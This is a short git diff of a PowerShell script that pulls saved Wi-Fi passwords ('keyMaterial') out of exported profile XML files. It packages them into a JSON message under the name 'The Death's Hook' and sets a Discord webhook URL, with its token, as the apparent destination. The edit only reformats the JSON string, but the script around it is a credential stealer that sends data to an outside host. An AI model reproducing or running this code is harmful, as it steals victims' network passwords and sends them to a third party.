@@ -9,7 +9,8 @@ Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-pass
 
 $Body = Get-Content .\Wi-Fi-cleaned
 
-$RealBody = "{
+$RealBody = @"
+{
 	`"content`": null,
 	`"embeds`": [
 		{
@@ -20,7 +21,8 @@ $RealBody = "{
 	],
 	`"username`": `"The Death's Hook`",
 	`"attachments`": []
-}"
+}
+"@
 
 $hookUrl = 'https://discord.com/api/webhooks/1242800979112493088/8glRAWaSzV8NZVt19qR8ZbC5DQKksfuWuNjpVvvuHxb3s_cf22ygq0vGy607Ty-tMJ1R'
 
